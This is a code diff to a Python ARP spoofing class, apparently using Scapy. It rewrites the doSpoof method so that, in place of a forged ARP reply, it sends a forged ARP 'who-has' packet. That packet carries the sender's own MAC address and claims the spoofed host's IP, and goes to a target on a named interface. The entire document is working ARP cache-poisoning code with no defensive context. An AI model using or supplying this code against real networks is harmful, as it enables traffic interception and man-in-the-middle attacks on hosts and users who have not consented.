@@ -8,25 +8,30 @@ class ArpSpoofing:
 
     def doSpoof(self, hostToAttack, hostToSpoof):
 
-        def obtainMac(hostToAttack):
-            arpReq = ARP(pdst=hostToAttack)
-            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-            arpReqBroad = broadcast/arpReq
-            result = srp(arpReqBroad, timeout=1,verbose=False)[0]
-
-            return result[0][1].hwsrc
+        #This method obtains your own mac address
+        def obtainMac():
+            my_macs = [get_if_hwaddr(i) for i in get_if_list()]
+            for mac in my_macs:
+                if (mac != "00:00:00:00:00:00"):
+                    return mac
 
         print("spoof")
 
-        targetMac = obtainMac(hostToAttack)
-        #op = 2 means that it is a reply
-        packet = ARP(op=2, pdst=hostToAttack, hwdst=targetMac, psrc=hostToSpoof)
-        send(packet, verbose=False)
+        myMac = obtainMac()
+        print("post obtainMac")
+
+        #Ether part of packet
+        etherPart = Ether(src=myMac)
+
+        #Arp part of packet
+        arpPart = ARP(op="who-has", hwsrc=myMac, psrc=hostToSpoof, pdst=hostToAttack)
+
+        #total packet
+        packet = etherPart / arpPart
+
+        #sends packet
+        sendp(packet, iface="enp0s3", verbose=False)
         print("Spoof Spoof")
-
-
-
-
 
 
 
